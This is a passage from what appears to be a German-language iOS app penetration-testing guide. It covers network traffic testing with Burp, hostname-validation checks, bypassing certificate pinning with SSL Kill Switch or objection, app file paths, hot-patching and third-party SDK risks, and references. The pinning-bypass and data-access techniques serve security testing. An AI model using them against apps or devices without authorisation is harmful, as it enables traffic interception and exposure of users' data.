{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Universelle Links

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity Sharing

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### App-Erweiterungen

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serialisierung und Codierung

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Netzwerkkommunikation

Es ist wichtig zu √ºberpr√ºfen, dass keine Kommunikation **ohne Verschl√ºsselung** stattfindet und dass die Anwendung das TLS-Zertifikat des Servers korrekt **validiert**.\
Um solche Probleme zu √ºberpr√ºfen, k√∂nnen Sie einen Proxy wie **Burp** verwenden:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Hostnamenpr√ºfung

Ein h√§ufiges Problem bei der Validierung des TLS-Zertifikats besteht darin, zu √ºberpr√ºfen, ob das Zertifikat von einer **vertrauensw√ºrdigen** **CA** signiert wurde, aber **nicht zu √ºberpr√ºfen**, ob **der Hostname** des Zertifikats der aufgerufene Hostname ist.\
Um dieses Problem mit Burp zu √ºberpr√ºfen, k√∂nnen Sie nachdem Sie der Burp-CA auf dem iPhone vertraut haben, ein **neues Zertifikat mit Burp f√ºr einen anderen Hostnamen erstellen** und es verwenden. Wenn die Anwendung immer noch funktioniert, ist etwas verwundbar.

### Zertifikats-Pinning

Wenn eine Anwendung SSL-Pinning korrekt verwendet, funktioniert die Anwendung nur, wenn das Zertifikat das erwartete ist. Bei der Pr√ºfung einer Anwendung **kann dies ein Problem sein, da Burp sein eigenes Zertifikat bereitstellt.**\
Um diesen Schutz in einem jailbroken Ger√§t zu umgehen, k√∂nnen Sie die Anwendung [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) installieren oder [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) installieren.

Sie k√∂nnen auch **objection's** `ios sslpinning disable` verwenden.

## Sonstiges

* In **`/System/Library`** finden Sie die auf dem Telefon installierten Frameworks, die von Systemanwendungen verwendet werden.
* Die vom Benutzer aus dem App Store installierten Anwendungen befinden sich in **`/User/Applications`**.
* Und das **`/User/Library`** enth√§lt vom Benutzer gespeicherte Daten von Anwendungen auf Benutzerebene.
* Sie k√∂nnen auf **`/User/Library/Notes/notes.sqlite`** zugreifen, um die in der Anwendung gespeicherten Notizen zu lesen.
* Im Ordner einer installierten Anwendung (**`/User/Applications/<APP ID>/`**) finden Sie einige interessante Dateien:
* **`iTunesArtwork`**: Das von der App verwendete Symbol
* **`iTunesMetadata.plist`**: Informationen zur App, die im App Store verwendet werden
* **`/Library/*`**: Enth√§lt die Einstellungen und den Cache. In **`/Library/Cache/Snapshots/*`** finden Sie den Snapshot, der von der Anwendung vor dem Senden in den Hintergrund erstellt wurde.

### Hot Patching/Erzwungenes Update

Die Entwickler k√∂nnen alle Installationen ihrer App sofort remote **patchen**, ohne die Anwendung erneut im App Store einreichen und auf die Genehmigung warten zu m√ºssen.\
Daf√ºr wird in der Regel [**JSPatch**](https://github.com/bang590/JSPatch) verwendet. Es gibt jedoch auch andere Optionen wie [Siren](https://github.com/ArtSabintsev/Siren) und [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Dies ist ein gef√§hrlicher Mechanismus, der von b√∂sartigen Drittanbieter-SDKs missbraucht werden k√∂nnte. Daher wird empfohlen, zu √ºberpr√ºfen, welche Methode zum automatischen Aktualisieren (falls vorhanden) verwendet wird, und sie zu testen.** Sie k√∂nnten versuchen, eine fr√ºhere Version der App herunterzuladen, um dies zu √ºberpr√ºfen.

### Drittanbieter

Eine bedeutende Herausforderung bei **Drittanbieter-SDKs** besteht in der **fehlenden granularen Kontrolle** √ºber ihre Funktionen. Entwickler stehen vor der Wahl: Entweder integrieren sie das SDK und akzeptieren alle seine Funktionen, einschlie√ülich potenzieller Sicherheitsl√ºcken und Datenschutzbedenken, oder sie verzichten vollst√§ndig auf dessen Vorteile. Oft k√∂nnen Entwickler Sicherheitsl√ºcken in diesen SDKs nicht selbst beheben. Dar√ºber hinaus k√∂nnen einige SDKs mit Malware infiziert sein, wenn sie das Vertrauen der Community gewinnen.

Die von Drittanbieter-SDKs bereitgestellten Dienste k√∂nnen das Tracking des Benutzerverhaltens, die Anzeige von Werbung oder die Verbesserung der Benutzererfahrung umfassen. Dies birgt jedoch ein Risiko, da Entwickler m√∂glicherweise nicht vollst√§ndig √ºber den von diesen Bibliotheken ausgef√ºhrten Code informiert sind, was zu potenziellen Datenschutz- und Sicherheitsrisiken f√ºhren kann. Es ist wichtig, die mit Drittanbieterdiensten geteilten Informationen auf das Notwendige zu beschr√§nken und sicherzustellen, dass keine sensiblen Daten offengelegt werden.

Die Implementierung von Drittanbieterdiensten erfolgt in der Regel in Form einer eigenst√§ndigen Bibliothek oder eines vollst√§ndigen SDKs. Um die Privatsph√§re der Benutzer zu sch√ºtzen, sollten alle mit diesen Diensten geteilten Daten **anonymisiert** werden, um die Offenlegung personenbezogener Informationen (PII) zu verhindern.

Um die von einer Anwendung verwendeten Bibliotheken zu identifizieren, kann das Befehlszeilentool **`otool`** verwendet werden. Dieses Tool sollte gegen die Anwendung und jede von ihr verwendete gemeinsam genutzte Bibliothek ausgef√ºhrt werden, um zus√§tzliche Bibliotheken zu entdecken.
```bash
otool -L <application_path>
```
## **Referenzen & Weitere Ressourcen**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS kostenlose Kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C Version [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift Version
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
